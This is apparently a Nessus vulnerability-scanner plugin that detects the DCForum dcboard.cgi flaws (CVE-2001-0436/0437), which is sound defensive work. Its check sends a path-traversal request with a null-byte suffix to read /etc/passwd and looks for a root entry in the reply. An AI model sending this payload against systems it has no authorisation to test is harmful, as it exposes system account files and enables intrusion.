#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10583);
 script_version ("$Revision: 1.32 $");
 script_cve_id("CVE-2001-0436", "CVE-2001-0437");
 script_bugtraq_id(2611);
 script_osvdb_id(3861, 3862, 3867);

 script_name(english:"DCForum dcboard.cgi Multiple Vulnerabilities");
 script_summary(english:"Checks for the presence of /cgi-bin/dcforum");
 
 script_set_attribute( attribute:"synopsis", value:
"The remote web server is hosting a CGI known to have multiple
vulnerabilities." );
 script_set_attribute( attribute:"description",  value:
"The DCForum dcboard.cgi script is installed. This CGI has some well
known security flaws, including one that lets an attacker execute
arbitrary commands with the privileges of the web server." );
 # https://web.archive.org/web/20020227074916/http://archives.neohapsis.com/archives/bugtraq/2001-04/0269.html
 script_set_attribute(
   attribute:"see_also",
   value:"http://www.nessus.org/u?92384774"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Remote this script from /cgi-bin."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2000/12/29");
 script_set_attribute(attribute:"vuln_publication_date", value: "2003/03/31");
 script_cvs_date("$Date: 2016/11/15 13:39:09 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");

 script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
dirs = list_uniq(make_list('/dcforum', cgi_dirs()));

foreach dir (dirs)
{
 url = string(
   dir,
   "/dcforum.cgi?az=list&forum=../../../../../../../etc/passwd%00"
 );
 r = http_send_recv3(method:"GET", item:url, port:port);
 if (isnull(r)) exit(0);

 if(egrep(pattern:".*root:.*:0:[01]:.*", string:r[2]))	
 {
 	security_hole(port);
 	exit(0);
 }
}



